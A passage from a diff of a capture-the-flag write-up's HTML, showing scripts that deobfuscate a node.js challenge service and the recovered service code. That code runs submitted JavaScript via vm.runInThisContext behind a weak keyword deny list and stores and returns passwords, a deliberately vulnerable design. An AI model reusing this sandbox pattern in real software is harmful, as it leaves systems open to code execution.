+            <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;b38a&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;Your password: &quot;</span> <span class="o">:</span> <span class="s1">&#39;Your code has runtime errors: &#39;</span><span class="p">;</span>
+            <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
+            <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">b</span> <span class="o">+</span> <span class="nx">E</span> <span class="o">+</span> <span class="nx">O</span><span class="p">);</span>
+          <span class="p">}</span>
+          <span class="k">try</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">A3a</span><span class="p">[</span><span class="nx">z</span><span class="p">](</span><span class="nx">password</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">p2</span><span class="p">],</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">y2</span><span class="p">))</span> <span class="p">{</span>
+              <span class="nx">storeSubmission</span><span class="p">(</span><span class="nx">data_json</span><span class="p">[</span><span class="nx">D</span><span class="p">],</span> <span class="nx">data_json</span><span class="p">[</span><span class="nx">T</span><span class="p">],</span> <span class="nx">code</span><span class="p">);</span>
+              <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
+              <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">w</span><span class="p">);</span>
+            <span class="p">}</span>
+          <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">console</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">R4</span><span class="p">](</span><span class="nx">E</span><span class="p">);</span>
+          <span class="p">}</span>
+          <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
+          <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">c</span><span class="p">);</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+      <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
+      <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">s</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
+      <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">V</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">});</span>
+<span class="p">}</span>
+<span class="kd">var</span> <span class="nx">A3a</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;U&#39;</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="nx">E</span> <span class="o">&gt;=</span> <span class="nx">b</span><span class="p">;</span>
+<span class="p">},</span> <span class="s1">&#39;q&#39;</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="nx">E</span> <span class="o">&lt;</span> <span class="nx">b</span><span class="p">;</span>
+<span class="p">},</span> <span class="s1">&#39;M&#39;</span><span class="o">:</span> <span class="p">{}};</span>
+<span class="nx">http</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;c534&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;submissions&quot;</span> <span class="o">:</span> <span class="nx">require</span><span class="p">(</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">Q4</span><span class="p">);</span>
+<span class="nx">ff</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;6422&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="mi">200</span> <span class="o">:</span> <span class="nx">require</span><span class="p">(</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">n2</span><span class="p">);</span>
+<span class="nx">process</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">t2</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">a4</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="s1">&#39;Caught exception: &#39;</span><span class="p">;</span>
+  <span class="nx">console</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">R4</span><span class="p">](</span><span class="nx">b</span> <span class="o">+</span> <span class="nx">E</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="nx">http</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">W4</span><span class="p">](</span><span class="nx">handle</span><span class="p">)[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">v2</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">M4</span><span class="p">,</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">d2</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">R4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">c4</span><span class="p">)</span>
+</code></pre></div>
 <p>Looks much better right? Well, not really.</p>
 
-<p>First, the <code>z9o2</code> object contains primitive values and it is referenced everywhere instead of using strings and numbers directly. Code like <code>A[z9o2.A4](z9o2.X2, {'Content-Type': z9o2.N4});</code> should be translated to <code>A.writeHead(200, {'Content-Type': 'text/plain'})</code> (<code>x['y']</code> is equivalent to <code>x.y</code> in JavaScript). I wrote a little node.js script to inline these:</p>
+<p>First, the <code>z9o2</code> object contains primitive values and it is referenced everywhere instead of using strings and numbers directly. Code like <code>A[z9o2.A4](z9o2.X2, {&#39;Content-Type&#39;: z9o2.N4});</code> should be translated to <code>A.writeHead(200, {&#39;Content-Type&#39;: &#39;text/plain&#39;})</code> (<code>x[&#39;y&#39;]</code> is equivalent to <code>x.y</code> in JavaScript). I wrote a little node.js script to inline these:</p>
+<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">z9o2</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;p2&#39;</span><span class="o">:</span> <span class="s2">&quot;length&quot;</span><span class="p">,</span> <span class="s1">&#39;n2&#39;</span><span class="o">:</span> <span class="s2">&quot;fs&quot;</span><span class="p">,</span> <span class="s1">&#39;w4&#39;</span><span class="o">:</span> <span class="s2">&quot;toString&quot;</span><span class="p">,</span> <span class="s1">&#39;J4&#39;</span><span class="o">:</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span> <span class="s1">&#39;v2&#39;</span><span class="o">:</span> <span class="s2">&quot;listen&quot;</span><span class="p">,</span> <span class="s1">&#39;R4&#39;</span><span class="o">:</span> <span class="s2">&quot;log&quot;</span><span class="p">,</span>
+            <span class="s1">&#39;a4&#39;</span><span class="o">:</span> <span class="s1">&#39;uncaughtException&#39;</span><span class="p">,</span> <span class="s1">&#39;d2&#39;</span><span class="o">:</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span>
+            <span class="s1">&#39;c4&#39;</span><span class="o">:</span> <span class="s1">&#39;Server running at http://0.0.0.0:1337/&#39;</span><span class="p">,</span> <span class="s1">&#39;Q4&#39;</span><span class="o">:</span> <span class="s2">&quot;http&quot;</span><span class="p">,</span> <span class="s1">&#39;N4&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span><span class="p">,</span>
+            <span class="s1">&#39;W4&#39;</span><span class="o">:</span> <span class="s2">&quot;createServer&quot;</span><span class="p">,</span> <span class="s1">&#39;Q2&#39;</span><span class="o">:</span> <span class="p">{},</span> <span class="s1">&#39;M4&#39;</span><span class="o">:</span> <span class="mi">1337</span><span class="p">,</span> <span class="s1">&#39;t2&#39;</span><span class="o">:</span> <span class="s2">&quot;on&quot;</span><span class="p">,</span> <span class="s1">&#39;s4&#39;</span><span class="o">:</span> <span class="s2">&quot;submissions&quot;</span><span class="p">,</span> <span class="s1">&#39;x2&#39;</span><span class="o">:</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span>
+            <span class="s1">&#39;y2&#39;</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;X2&#39;</span><span class="o">:</span> <span class="mi">200</span><span class="p">,</span> <span class="s1">&#39;f2&#39;</span><span class="o">:</span> <span class="s2">&quot;end&quot;</span><span class="p">,</span> <span class="s1">&#39;l2&#39;</span><span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s1">&#39;A4&#39;</span><span class="o">:</span> <span class="s2">&quot;writeHead&quot;</span><span class="p">};</span>
+<span class="nx">source</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">).</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]).</span><span class="nx">toString</span><span class="p">()</span>
+<span class="k">for</span> <span class="p">(</span><span class="nx">key</span> <span class="k">in</span> <span class="nx">z9o2</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="nx">z9o2</span><span class="p">[</span><span class="nx">key</span><span class="p">])</span> <span class="o">==</span> <span class="s1">&#39;number&#39;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">source</span> <span class="o">=</span> <span class="nx">source</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;z9o2.&#39;</span> <span class="o">+</span> <span class="nx">key</span><span class="p">,</span> <span class="s1">&#39;g&#39;</span><span class="p">),</span> <span class="nx">z9o2</span><span class="p">[</span><span class="nx">key</span><span class="p">])</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nx">source</span> <span class="o">=</span> <span class="nx">source</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;\\[z9o2.&#39;</span> <span class="o">+</span> <span class="nx">key</span> <span class="o">+</span> <span class="s1">&#39;]&#39;</span><span class="p">,</span> <span class="s1">&#39;g&#39;</span><span class="p">),</span> <span class="s2">&quot;.&quot;</span> <span class="o">+</span> <span class="nx">z9o2</span><span class="p">[</span><span class="nx">key</span><span class="p">])</span>
+        <span class="nx">source</span> <span class="o">=</span> <span class="nx">source</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;z9o2.&#39;</span> <span class="o">+</span> <span class="nx">key</span><span class="p">,</span> <span class="s1">&#39;g&#39;</span><span class="p">),</span> <span class="s2">&quot;&#39;&quot;</span> <span class="o">+</span> <span class="nx">z9o2</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">)</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">source</span><span class="p">)</span>
+</code></pre></div>
+<p>Then, there are lot of conditional expressions that use the <code>r3A8.J8()</code> function like this: <code>r3A8.J8(&quot;1b&quot;) ? &quot;k&quot; : &quot;runInThisContext&quot;</code>. It seems to be some kind of hash function with a boolean output, since it&#39;s a pure function without side effects. (<strong>Update</strong>: it turned out to be this simple only for the duration of the competition since it checks the date :) For a deeper analysis of this function, see <a href="http://wizardsofdos.de/blog/?p=1254096">this writeup</a>) I wrote another small script to resolve these:</p>
+<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">source</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">).</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]).</span><span class="nx">toString</span><span class="p">();</span>
+<span class="kd">var</span> <span class="nx">ast</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;esprima&#39;</span><span class="p">).</span><span class="nx">parse</span><span class="p">(</span><span class="nx">source</span><span class="p">);</span>
 
-<p><code>javascript
-var z9o2 = {'p2': "length", 'n2': "fs", 'w4': "toString", 'J4': "-", 'v2': "listen", 'R4': "log",
-            'a4': 'uncaughtException', 'd2': '0.0.0.0',
-            'c4': 'Server running at http://0.0.0.0:1337/', 'Q4': "http", 'N4': 'text/plain',
-            'W4': "createServer", 'Q2': {}, 'M4': 1337, 't2': "on", 's4': "submissions", 'x2': "/",
-            'y2': 1, 'X2': 200, 'f2': "end", 'l2': "", 'A4': "writeHead"};
-source = require('fs').readFileSync(process.argv[2]).toString()
-for (key in z9o2) {
-    if (typeof(z9o2[key]) == 'number') {
-        source = source.replace(RegExp('z9o2.' + key, 'g'), z9o2[key])
-    } else {
-        source = source.replace(RegExp('\\[z9o2.' + key + ']', 'g'), "." + z9o2[key])
-        source = source.replace(RegExp('z9o2.' + key, 'g'), "'" + z9o2[key] + "'")
-    }
-}
-console.log(source)
-</code></p>
+<span class="kd">var</span> <span class="nx">r3A8</span> <span class="o">=</span> <span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span> <span class="cm">/* ... copied from the source file */</span> <span class="p">})();</span>
 
-<p>Then, there are lot of conditional expressions that use the <code>r3A8.J8()</code> function like this: <code>r3A8.J8("1b") ? "k" : "runInThisContext"</code>. It seems to be some kind of hash function with a boolean output, since it’s a pure function without side effects. (<strong>Update</strong>: it turned out to be this simple only for the duration of the competition since it checks the date :) For a deeper analysis of this function, see <a href="http://wizardsofdos.de/blog/?p=1254096">this writeup</a>) I wrote another small script to resolve these:</p>
+<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">);</span>
 
-<p>```javascript
-var source = require(‘fs’).readFileSync(process.argv[2]).toString();
-var ast = require(‘esprima’).parse(source);</p>
+<span class="kd">function</span> <span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="c1">// Match only expressions like r3A8.J8(a) ? b : c</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">ast</span><span class="p">.</span><span class="nx">test</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">object</span><span class="p">.</span><span class="nx">name</span> <span class="o">==</span> <span class="s2">&quot;r3A8&quot;</span> <span class="o">&amp;&amp;</span> <span class="nx">ast</span><span class="p">.</span><span class="nx">test</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">property</span><span class="p">.</span><span class="nx">name</span> <span class="o">==</span> <span class="s1">&#39;J8&#39;</span><span class="p">)</span> <span class="p">{</span>
+      <span class="c1">// Resolving the conditional expression</span>
+      <span class="kd">var</span> <span class="nx">decision</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="nx">ast</span><span class="p">.</span><span class="nx">test</span><span class="p">.</span><span class="nx">arguments</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span><span class="p">);</span>
+      <span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="nx">decision</span> <span class="o">?</span> <span class="nx">ast</span><span class="p">.</span><span class="nx">consequent</span> <span class="o">:</span> <span class="nx">ast</span><span class="p">.</span><span class="nx">alternate</span><span class="p">;</span>
+      <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">ast</span><span class="p">)</span> <span class="k">delete</span> <span class="nx">ast</span><span class="p">[</span><span class="nx">key</span><span class="p">];</span>
+      <span class="k">for</span> <span class="p">(</span><span class="nx">key</span> <span class="k">in</span> <span class="nx">value</span><span class="p">)</span> <span class="nx">ast</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">[</span><span class="nx">key</span><span class="p">];</span>
+      <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{}</span>
 
-<p>var r3A8 = (function () { /* … copied from the source file */ })();</p>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">ast</span> <span class="k">instanceof</span> <span class="nb">Object</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">ast</span><span class="p">)</span> <span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">[</span><span class="nx">key</span><span class="p">]);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
 
-<p>traverse(ast);</p>
+<span class="kd">var</span> <span class="nx">source</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;escodegen&#39;</span><span class="p">).</span><span class="nx">generate</span><span class="p">(</span><span class="nx">ast</span><span class="p">);</span>
 
-<p>function traverse(ast) {
-  try {
-    // Match only expressions like r3A8.J8(a) ? b : c
-    if (ast.test.callee.object.name == “r3A8” &amp;&amp; ast.test.callee.property.name == ‘J8’) {
-      // Resolving the conditional expression
-      var decision = r3A8.J8(ast.test.arguments[0].value);
-      var value = decision ? ast.consequent : ast.alternate;
-      for (var key in ast) delete ast[key];
-      for (key in value) ast[key] = value[key];
-      return;
-    }
-  } catch (e) {}</p>
-
-<p>if (ast instanceof Object) {
-    for (var key in ast) traverse(ast[key]);
-  }
-}</p>
-
-<p>var source = require(‘escodegen’).generate(ast);</p>
-
-<p>console.log(source)
-```</p>
-
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">source</span><span class="p">)</span>
+</code></pre></div>
 <p>There were a few more tricks that were only present in a few lines; those were resolved by hand. After inlining most of the variables in the resulting code (modern IDEs usually provide a shortcut to easily do that), it looks like a normal node.js program now.</p>
 
-<h2 id="the-deobfuscated-code">The deobfuscated code</h2>
+<h2>The deobfuscated code</h2>
+<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">http</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;http&#39;</span><span class="p">);</span>
+<span class="nx">ff</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
 
-<p>```javascript
-http = require(‘http’);
-ff = require(‘fs’);</p>
+<span class="kd">function</span> <span class="nx">loadSubmission</span><span class="p">(</span><span class="nx">flag_id</span><span class="p">,</span> <span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">O</span> <span class="o">=</span> <span class="nx">ff</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;submissions/&#39;</span> <span class="o">+</span> <span class="nx">flag_id</span> <span class="o">+</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="nx">token</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;dfsd &#39;</span><span class="p">,</span> <span class="nx">O</span><span class="p">,</span> <span class="nx">O</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/password = &quot;([0-9a-zA-Z]{16})&quot;/</span><span class="p">));</span>
+        <span class="k">return</span> <span class="nx">O</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/password = &quot;([0-9a-zA-Z]{16})&quot;/</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{}</span>
+    <span class="k">return</span> <span class="s1">&#39;No password found&#39;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kd">function</span> <span class="nx">storeSubmission</span><span class="p">(</span><span class="nx">flag_id</span><span class="p">,</span> <span class="nx">token</span><span class="p">,</span> <span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">Z</span> <span class="o">=</span> <span class="nx">ff</span><span class="p">.</span><span class="nx">statSync</span><span class="p">(</span><span class="s1">&#39;submissions&#39;</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">Z</span><span class="p">)</span> <span class="nx">ff</span><span class="p">.</span><span class="nx">mkdirSync</span><span class="p">(</span><span class="s1">&#39;submissions&#39;</span><span class="p">);</span>
+    <span class="nx">ff</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="s1">&#39;submissions/&#39;</span> <span class="o">+</span> <span class="nx">flag_id</span> <span class="o">+</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="nx">token</span><span class="p">,</span> <span class="nx">code</span><span class="p">);</span>
+<span class="p">}</span>
 
-<p>function loadSubmission(flag_id, token) {
-    try {
-        var O = ff.readFileSync(‘submissions/’ + flag_id + ‘-‘ + token).toString();
-        console.log(‘dfsd ‘, O, O.match(/password = “([0-9a-zA-Z]{16})”/));
-        return O.match(/password = “([0-9a-zA-Z]{16})”/)[1];
-    } catch (E) {}
-    return ‘No password found’;
-}
-function storeSubmission(flag_id, token, code) {
-    try {
-        var Z = ff.statSync(‘submissions’);
-    } catch (E) {}
-    if (!Z) ff.mkdirSync(‘submissions’);
-    ff.writeFileSync(‘submissions/’ + flag_id + ‘-‘ + token, code);
-}</p>
 
-<p>function test(code) {
-    password = ‘’;
-    global = ‘’;
-    require(‘vm’).runInThisContext(code.toString());
-}
-function checkCode(code) {
-    var checks = [
-            /eval/,
-            /global/,
-            /Function/,
-            /this/
-        ];
-    for (var z = 0; z &lt; checks.length; z++) {
-        if (checks[z].test(code)) {
-            return false;
-        }
-    }
-    return true;
-}</p>
+<span class="kd">function</span> <span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="nx">global</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">).</span><span class="nx">runInThisContext</span><span class="p">(</span><span class="nx">code</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
+<span class="p">}</span>
+<span class="kd">function</span> <span class="nx">checkCode</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">checks</span> <span class="o">=</span> <span class="p">[</span>
+            <span class="sr">/eval/</span><span class="p">,</span>
+            <span class="sr">/global/</span><span class="p">,</span>
+            <span class="sr">/Function/</span><span class="p">,</span>
+            <span class="sr">/this/</span>
+        <span class="p">];</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">z</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">z</span> <span class="o">&lt;</span> <span class="nx">checks</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">z</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">checks</span><span class="p">[</span><span class="nx">z</span><span class="p">].</span><span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+<span class="p">}</span>
 
-<p>function handlePOST(req, res) {
-    req.on(‘data’, function (k) {
-        console.log(k.toString());
-        try {
-            data_json = JSON.parse(k);
-        } catch (E) {
-            data_json = {};
-        }
-        if (data_json.hasOwnProperty(‘flag_id’) &amp;&amp; data_json.hasOwnProperty(‘token’)) {
-            if (!data_json.hasOwnProperty(‘code’)) {
-                old_password = loadSubmission(data_json.flag_id, data_json.token);
-                res.writeHead(200, { ‘Content-Type’: ‘text/plain’ });
-                res.end(‘Your password: ‘ + old_password + ‘\n’);
-            } else {
-                password = ‘’;
-                code = data_json[‘code’];
-                if (checkCode(code)) {
-                    try {
-                        test(code.toString());
-                    } catch (E) {
-                        res.writeHead(200, { ‘Content-Type’: ‘text/plain’ });
-                        res.end(‘Your code has runtime errors: ‘ + E + ‘\n’);
-                    }
-                    try {
-                        if (password.length &gt;= 1) {
-                            storeSubmission(data_json[‘flag_id’], data_json[‘token’], code);
-                            res.writeHead(200, { ‘Content-Type’: ‘text/plain’ });
-                            res.end(‘Code approved. Please check your parameters carefully before deploying the code to the nuclear reactor.\n’);
-                        }
-                    } catch (E) {
-                        console.log(E);
-                    }
-                    res.writeHead(200, { ‘Content-Type’: ‘text/plain’ });
-                    res.end(‘Your code is missing an access code to the nuclear reactor. Expected variable according to the documentation is “password”.\n’);
-                }
-            }
-            res.writeHead(200, { ‘Content-Type’: ‘text/plain’ });
-            res.end(‘Code contains unsafe functionality.\n’);
-        } else {
-            res.writeHead(200, { ‘Content-Type’: ‘text/plain’ });
-            res.end(‘Your JSON is malformed. Please provide the following properties: flag_id, token, code\n’);
-        }
-    });
-}</p>
+<span class="kd">function</span> <span class="nx">handlePOST</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">req</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">k</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
+        <span class="k">try</span> <span class="p">{</span>
+            <span class="nx">data_json</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">k</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">data_json</span> <span class="o">=</span> <span class="p">{};</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">data_json</span><span class="p">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="s1">&#39;flag_id&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">data_json</span><span class="p">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">data_json</span><span class="p">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="s1">&#39;code&#39;</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nx">old_password</span> <span class="o">=</span> <span class="nx">loadSubmission</span><span class="p">(</span><span class="nx">data_json</span><span class="p">.</span><span class="nx">flag_id</span><span class="p">,</span> <span class="nx">data_json</span><span class="p">.</span><span class="nx">token</span><span class="p">);</span>
